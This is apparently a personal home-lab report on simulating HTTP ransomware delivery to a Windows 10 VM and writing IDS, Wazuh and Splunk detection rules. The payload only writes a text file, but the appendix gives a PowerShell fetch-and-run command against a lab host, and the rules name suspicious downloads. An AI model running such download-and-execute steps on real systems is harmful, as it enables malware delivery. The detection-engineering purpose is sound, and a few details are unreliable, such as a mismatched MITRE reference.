# Ransomware Attack Simulation Lab Report

**Date:** 12 May 2026  
**Lab Environment:** VMware vSphere with IPFire firewall, Kali Linux, Windows 10, Wazuh 4.14.5, Splunk  
**Objective:** Simulate HTTP-based ransomware delivery, capture attack traffic, and develop detection rules

---

## Executive Summary

This lab demonstrates end-to-end ransomware attack simulation and detection strategy. An attacker payload was delivered via HTTP to a Windows 10 target, executed locally, and captured using network forensics. The exercise validates detection capabilities across network, host, and log-based layers.

---

## Lab Architecture

### Network Layout

```
┌─────────────────────────────────────────────────────┐
│                    IPFire Firewall                   │
│              (192.168.1.1 - Green Zone)              │
└─────────────────────────────────────────────────────┘
          │
          ├─ Green Zone (192.168.1.0/24)
          │  ├── Wazuh Manager: 192.168.1.20
          │  └── Splunk Indexer: 192.168.1.x
          │
          └─ Orange Zone (192.168.243.0/24)
             ├── Windows 10 Target: 192.168.243.129
             └── Kali Attacker: 192.168.243.130

```

### Key Constraints & Solutions

- **Challenge:** Orange and Green zones initially isolated; Wazuh manager unreachable from Windows 10 target
- **Solution:** Prioritized network forensics via tcpdump PCAP capture for post-incident analysis
- **Lesson:** Enterprise networks often require post-attack forensic analysis when real-time cross-zone monitoring isn't available

---

## Attack Scenario

### Methodology: HTTP-Based Payload Delivery

This reflects real-world ransomware distribution patterns (phishing emails, drive-by downloads, etc.)

### Attack Timeline

| Step | Actor | Action | Details |
|------|-------|--------|---------|
| 1 | Attacker (Kali) | Host payload | Python3 HTTP server on port 8000 |
| 2 | Attacker (Kali) | Capture traffic | tcpdump -i eth0 -w ransomware_attack.pcapng |
| 3 | Target (Win10) | Initiate download | PowerShell Invoke-WebRequest to http://192.168.243.130:8000/payload.bat |
| 4 | Target (Win10) | Execute payload | & C:\windows\temp\payload.bat |
| 5 | Target (Win10) | Proof of execution | File created: C:\windows\temp\ransom_note.txt |
| 6 | Defender | Capture forensics | PCAP exported from Wireshark |

### Payload Used

```batch
@echo off
echo RANSOMWARE EXECUTED > C:\windows\temp\ransom_note.txt
```

**Note:** Proof-of-concept payload for lab. In real-world scenarios, this would be actual encryption logic (ransomware families like WannaCry, REvil, etc.)

---

## Network Forensics - Captured Traffic

### PCAP Analysis Output

```
Source IP           Dest IP            Port    Direction  URI
192.168.243.129     192.168.243.130    8000    Outbound   GET /payload.bat
192.168.243.130     192.168.243.129    49894   Inbound    HTTP 200 OK (payload response)
192.168.243.129     192.168.243.130    8000    Outbound   (connection teardown)
192.168.243.129     239.255.255.250    *       Broadcast  (MDNS/NetBIOS, incidental)
```

**Key Observations:**

1. **Outbound HTTP to non-standard port (8000)** - Suspicious
2. **Executable file download (.bat)** - High-risk file type
3. **Attacker-controlled IP (192.168.243.130)** - Known malicious source
4. **Short connection window** - Rapid download and execution

---

## Detection Strategy

### Layer 1: Network-Based Detection (IDS/NIDS)

**Signatures to detect:**

```
Alert http $HOME_NET any -> $EXTERNAL_NET any 
  (msg:"HTTP Download of Suspicious Executable (.bat)"; 
   content:"GET"; 
   http_uri; 
   content:".bat"; 
   nocase; 
   classtype:suspicious-activity; 
   sid:1000001;)

Alert tcp $HOME_NET any -> $EXTERNAL_NET 8000 
  (msg:"Outbound Connection to Non-Standard HTTP Port"; 
   flags:S; 
   classtype:suspicious-activity; 
   sid:1000002;)
```

**Detection Rationale:**
- `.bat`, `.exe`, `.ps1`, `.vbs` files via HTTP are anomalous
- Port 8000 is non-standard for legitimate web traffic
- Combination of both indicates staged attack delivery

### Layer 2: Host-Based Detection (Wazuh Agent)

**File Integrity Monitoring (FIM):**

```xml
<syscheck>
  <directories realtime="yes">C:\windows\temp</directories>
  <alert_new_files>yes</alert_new_files>
</syscheck>
```

**Detection Logic:**
- Alert on new `.bat`, `.exe`, `.cmd`, `.ps1` files in C:\windows\temp\
- Correlate with parent process execution

**Process Monitoring (Windows Event Log):**

```
Event ID: 4688 (Process Creation)
  Parent Process: powershell.exe
  Process: payload.bat
  Command Line: C:\windows\temp\payload.bat
```

**Wazuh Rule Example:**

```xml
<rule id="100001" level="7">
  <if_sid>4688</if_sid>
  <field name="ParentImage">powershell.exe</field>
  <field name="Image">.bat</field>
  <field name="CommandLine">C:\\windows\\temp</field>
  <description>Batch file execution from temp directory via PowerShell</description>
</rule>
```

### Layer 3: Log-Based Detection (Splunk/Wazuh)

**Correlation Query:**

```spl
index=windows EventCode=4688 
| where ParentImage="*powershell*" AND Image="*payload.bat"
| stats count by ComputerName, User, Image, ParentImage, CommandLine
| where count > 0
```

**Alert Trigger:**
- Combine file creation in C:\windows\temp\ + process execution + suspicious parent process
- Alert severity: HIGH

---

## Detection Rules Summary

| Detection Layer | Signal | Severity | Confidence |
|-----------------|--------|----------|-----------|
| Network (IDS) | .bat download via HTTP/8000 | HIGH | HIGH |
| Host (FIM) | New file in C:\windows\temp\ | MEDIUM | HIGH |
| Host (Process) | payload.bat spawned by powershell.exe | HIGH | HIGH |
| Correlation | FIM + Process + Network in <5 sec window | CRITICAL | HIGH |

---

## Artifacts & Evidence

### Files Generated

- **PCAP:** `ransomware_attack..pcapng` (12 KB)
  - Contains full HTTP exchange and connection details
- **Target Evidence:** `C:\windows\temp\ransom_note.txt`
  - Proves payload execution

### Forensic Timeline

```
06:47:22 - Windows 10 initiates HTTP GET /payload.bat
06:47:22 - Kali HTTP server responds with payload
06:47:28 - PowerShell executes payload.bat
06:47:28 - ransom_note.txt created in C:\windows\temp\
```

---

## Security Lessons & Real-World Applicability

### 1. Defense in Depth

This lab demonstrated the value of layered detection:
- Network detection alone catches the delivery
- Host-based detection catches execution
- Correlation catches the full chain

**Enterprise Implication:** A single detection layer (e.g., network IDS) would have alerted on suspicious traffic, but host-based FIM + process monitoring provides confidence in actual compromise.

### 2. Network Segmentation

- Orange zone (attacker + target) isolated from Green zone (monitoring infrastructure)
- Required post-incident forensics rather than real-time agent monitoring
- **Lesson:** Segmentation increases security but requires robust logging + forensic capabilities

### 3. Ransomware Delivery Vectors

HTTP-based delivery is common because:
- Bypasses email filtering (if phishing vector)
- Evades some network controls (low-and-slow delivery)
- Compatible with staged payloads (lightweight initial download)

**Real-world context:** WannaCry, REvil, and Lockbit variants all use similar HTTP delivery patterns.

---

## Recommendations

### Immediate Actions

1. **Ingestion:** Feed PCAP into Splunk/Wazuh for replay analysis
2. **Rule Deployment:** Push generated detection rules to production
3. **Tuning:** Adjust thresholds to match baseline traffic patterns

### Long-term Hardening

1. **Outbound HTTP Restrictions:** Block non-standard ports (8000, 8080, etc.) unless explicitly needed
2. **File Execution Policy:** Restrict execution from C:\windows\temp\ (AppLocker/WDAC)
3. **PowerShell Logging:** Enable script block logging + constrained language mode
4. **EDR Deployment:** Endpoint Detection & Response tools (Crowdstrike, SentinelOne) for behavioral analysis

### Monitoring Enhancement

- **Agent-based Monitoring:** Place Wazuh agent in orange zone for real-time visibility
- **Firewall Rules:** Allow agent-to-manager communication (ports 1514/1515) for cross-zone monitoring
- **Incident Response:** Develop playbook for ransomware containment + recovery

---

## Lab Outcomes

✅ **Objectives Achieved:**
- Simulated realistic ransomware delivery (HTTP-based payload download)
- Captured attack traffic with network forensics
- Documented detection opportunities across 3 layers
- Developed actionable Wazuh/Splunk rules
- Demonstrated correlation of network + host + log evidence

✅ **Skills Demonstrated:**
- Network forensics (tcpdump, PCAP analysis)
- Attack simulation (attacker perspective)
- Detection engineering (rule development)
- Incident response (timeline analysis, artifact collection)
- Security architecture (defense in depth, segmentation)

---

## References

- MITRE ATT&CK: Lateral Movement via [Windows Admin Shares (T1021.002)](https://attack.mitre.org/techniques/T1021/002/)
- MITRE ATT&CK: Ingress Tool Transfer [T1105](https://attack.mitre.org/techniques/T1105/)
- Wazuh Documentation: [File Integrity Monitoring](https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html)
- Splunk: [Windows Event Code Reference](https://docs.splunk.com/Documentation/UBA/5.3.1/GetDataIn/WindowsEventCodesReference)

---

## Appendix: Lab Setup Commands

### Kali (Attacker)

```bash
# Create payload
cat > payload.bat << 'EOF'
@echo off
echo RANSOMWARE EXECUTED > C:\windows\temp\ransom_note.txt
EOF

# Host HTTP server
python3 -m http.server 8000

# Capture traffic (in separate terminal)
sudo tcpdump -i eth0 -w ransomware_attack.pcapng host 192.168.243.129
```

### Windows 10 (Target)

```powershell
# Download and execute payload
$url = "http://192.168.243.130:8000/payload.bat"
$output = "C:\windows\temp\payload.bat"
Invoke-WebRequest -Uri $url -OutFile $output
& $output

# Verify execution
Get-Content C:\windows\temp\ransom_note.txt
```

---

**Lab Completed By:** Davey  
**Environment:** VMware Home Lab with Kali Linux, Windows 10, Wazuh 4.14.5  
**Duration:** ~2 hours (including troubleshooting)  
**Purpose:** Hands-on ransomware detection engineering for endpoint security role preparation
